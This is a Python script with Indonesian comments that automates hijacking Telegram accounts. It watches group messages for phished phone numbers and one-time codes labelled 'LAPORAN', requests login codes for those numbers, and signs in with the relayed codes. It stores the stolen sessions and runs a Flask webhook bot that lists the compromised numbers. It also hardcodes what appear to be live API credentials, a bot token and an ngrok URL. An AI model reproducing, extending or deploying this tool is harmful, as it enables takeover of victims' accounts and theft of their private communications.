import asyncio
import json
import os
import re
import threading
from flask import Flask, request
import requests

from telethon import TelegramClient, events
from telethon.sessions import StringSession

# === Konfigurasi ===
api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'
bot_token = '7931229728:AAHFb4GiOT7sLOe3Wyc5xj-4j61TIDTmOas'
WEBHOOK_URL = "https://7259-182-253-143-59.ngrok-free.app/7931229728:AAHFb4GiOT7sLOe3Wyc5xj-4j61TIDTmOas"
  # Ganti jika pakai hosting / ngrok

SESSIONS_FILE = "sessions.json"
pending_login = {}  # Simpan {phone: TelegramClient} untuk login setelah OTP

# === Simpan Session ke File ===
def save_session(phone_number):
    sessions = load_sessions()
    if phone_number not in sessions:
        sessions.append(phone_number)
        with open(SESSIONS_FILE, "w") as f:
            json.dump(sessions, f)

def load_sessions():
    if os.path.exists(SESSIONS_FILE):
        with open(SESSIONS_FILE, "r") as f:
            try:
                return json.load(f)
            except:
                return []
    return []

# === TelegramClient utama untuk monitoring grup ===
client = TelegramClient('main', api_id, api_hash)

# === Handler Pesan Masuk dari Grup ===
@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    if any(keyword in msg for keyword in ['❮ LAPORAN SM ❯', '❮ LAPORAN Judul ❯', '❮ LAPORAN AB ❯']):
        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)

        if phone_match:
            phone = phone_match.group(1)

            if otp_match:
                otp = otp_match.group(1)
                print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
                if phone in pending_login:
                    await complete_login(phone, otp)
                else:
                    print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
            else:
                print(f"[📞] Menerima nomor: {phone} (mengirim OTP request...)")
                await request_otp(phone)

# === Kirim OTP Request ===
async def request_otp(phone):
    try:
        login_client = TelegramClient(phone, api_id, api_hash)
        await login_client.connect()

        if not await login_client.is_user_authorized():
            await login_client.send_code_request(phone)
            pending_login[phone] = login_client
            print(f"[🔐] Kode OTP dikirim ke {phone}, menunggu OTP...")
        else:
            print(f"[✅] {phone} sudah login sebelumnya.")
            save_session(phone)
            await login_client.disconnect()
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")

# === Login Setelah Dapat OTP ===
async def complete_login(phone, otp):
    try:
        login_client = pending_login.get(phone)
        if login_client:
            await login_client.sign_in(phone, otp)
            print(f"[✅] Login sukses untuk {phone}")
            save_session(phone)
            await login_client.disconnect()
            del pending_login[phone]
        else:
            print(f"[❌] Tidak ada client aktif untuk {phone}")
    except Exception as e:
        print(f"[❌] Gagal login {phone}: {e}")

# === FLASK BOT UNTUK /sessions ===
app = Flask(__name__)

def send_sessions_button(chat_id, bot_token):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📱 Lihat Session Login", "callback_data": "show_sessions"}]
        ]
    }
    requests.post(
        f"https://api.telegram.org/bot{bot_token}/sendMessage",
        data={
            "chat_id": chat_id,
            "text": "Klik tombol di bawah untuk melihat nomor yang sudah login:",
            "reply_markup": json.dumps(keyboard)
        }
    )

@app.route(f"/{bot_token}", methods=["POST"])
def webhook():
    data = request.get_json()

    if "message" in data:
        message = data["message"]
        text = message.get("text", "")
        chat_id = message["chat"]["id"]

        if text == "/sessions":
            send_sessions_button(chat_id, bot_token)

    elif "callback_query" in data:
        query = data["callback_query"]
        data_cb = query["data"]
        chat_id = query["message"]["chat"]["id"]
        msg_id = query["message"]["message_id"]

        if data_cb == "show_sessions":
            sessions = load_sessions()
            if sessions:
                session_list = "\n".join(f"{i+1}. {num}" for i, num in enumerate(sessions))
                reply = f"✅ Nomor yang sudah login:\n\n{session_list}"
            else:
                reply = "❌ Belum ada nomor yang login."

            requests.post(
                f"https://api.telegram.org/bot{bot_token}/editMessageText",
                data={
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": reply
                }
            )

    return "ok", 200

# === SETUP WEBHOOK TELEGRAM ===
def set_webhook():
    webhook_url = f"https://api.telegram.org/bot{bot_token}/setWebhook"
    response = requests.post(webhook_url, data={"url": WEBHOOK_URL})
    print("[🌐] Set Webhook:", response.text)

# === Jalankan Flask + Telethon ===
def start_flask():
    app.run(port=5000)

async def main():
    await client.start()
    print("[🤖] Bot Telegram & OTP listener aktif...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    threading.Thread(target=start_flask).start()
    set_webhook()  # Penting untuk aktifkan webhook!
    asyncio.run(main())
